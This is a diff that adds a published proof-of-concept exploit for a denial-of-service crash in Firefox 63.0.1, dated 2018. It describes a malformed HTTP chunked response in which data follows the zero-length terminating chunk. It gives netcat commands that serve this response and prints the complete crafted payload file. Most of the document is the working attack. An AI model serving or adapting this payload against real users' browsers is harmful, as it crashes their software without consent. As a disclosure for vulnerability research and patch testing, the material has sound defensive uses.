@@ -1,0 +1,94 @@
+# Exploit Title: Mozilla Firefox 63.0.1 - Denial of Service (PoC)
+# Date: 2018-11-29
+# Exploit Author: SAIKUMAR CHEBROLU
+# Vendor Homepage: https://www.mozilla.org/en-US/firefox/new/
+# Bugzilla report: https://bugzilla.mozilla.org/show_bug.cgi?id=1504512
+# Version: Firefox 63.0.1
+# Tested on: Windows 10
+# CVE : No CVE is been assigned to this bug.
+
+# To exploit this vulnerability please follow the below steps.
+# Firefox is being crashed, when it tried to process the chunked data. when Transfer-Encoding header 
+# is used, we suppose to send the data in the chunks form. When all the chunks being transferred, 
+# we need to tell the client with chunk length zero. so that it understands chunked stream completed. 
+
+# But if we send the data after sending zero length, then firefox not able to understand it, 
+# and it being crashed.
+
+# Example:
+
+5
+
+Don't
+
+5
+
+be af
+
+5
+
+firef
+
+5
+
+ox is
+
+0      
+
+Crash       (after saying it is end, we still sending some data)    
+
+\r\n
+
+# here we are saying no chunked data after this.so that it should end with \r\n. But we 
+# are sending some data after this also. Like
+
+# Steps to reproduce the crash
+
+1)download the firefoxcrash.txt
+
+2)nc -lp 8000 < firefoxcrash.txt
+
+3)browe the url from firefox like  http://localhost:8000
+
+4)then close the netcat client. then you will obserev the firefox crash.
+
+# fireforcrash.txt
+
+HTTP/1.1 200 ok
+Content-type: application/octet-stream
+Content-disposition: attachment; filename="crash.txt"
+Transfer-Encoding: chunked
+Connection: close
+
+5
+I am 
+5
+ be a
+5
+fraid
+5
+ to l
+5
+ook a
+5
+t thi
+5
+s mes
+5
+sage.
+5
+ It i
+5
+s com
+5
+plete
+5
+ly ha
+5
+rmles
+5
+s. Re
+5
+ally!
+0
+foobar
